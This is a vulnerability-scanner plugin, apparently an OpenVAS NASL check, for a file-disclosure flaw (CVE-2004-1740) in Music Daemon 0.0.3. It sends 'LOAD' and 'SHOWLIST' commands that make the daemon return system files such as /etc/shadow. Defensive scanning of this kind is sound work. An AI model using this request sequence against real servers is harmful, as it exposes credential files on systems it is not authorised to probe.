# SPDX-FileCopyrightText: 2004 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14354");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1740");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11006");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Music Daemon <= 0.0.3 File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 Noam Rathaus");
  script_family("Remote file access");
  script_dependencies("find_service2.nasl", "os_detection.nasl");
  script_require_ports("Services/musicdaemon", 5555);

  script_tag(name:"summary", value:"Music Daemon is prone to a file disclosure vulnerability.");

  script_tag(name:"insight", value:"It is possible to cause the Music Daemon to disclose the content
  of arbitrary files by inserting them to the list of tracks to listen to.");

  script_tag(name:"impact", value:"An attacker can list the content of arbitrary files including the
  /etc/shadow file, as by default the daemon runs under root privileges.");

  script_tag(name:"affected", value:"Music Daemon version 0.0.3 and prior is known to be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("port_service_func.inc");

port = service_get_port(default:5555, proto:"musicdaemon");

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

files = traversal_files();

recv = recv_line(socket:soc, length: 1024);

if ("Hello" >< recv)
{
  foreach pattern(keys(files)) {

    file = files[pattern];

    data = string("LOAD /" + file + "\r\n");
    send(socket:soc, data: data);

    data = string("SHOWLIST\r\n");
    send(socket:soc, data: data);

    recv = recv(socket:soc, length: 1024);
    close(soc);
    if (egrep(pattern:pattern, string:recv)) {
      report = 'It was possible to read the file "/' + file + '" and extract the following content:\n' + recv;
      security_message(data:report, port:port);
      exit(0);
    }
  }
}

exit(99);
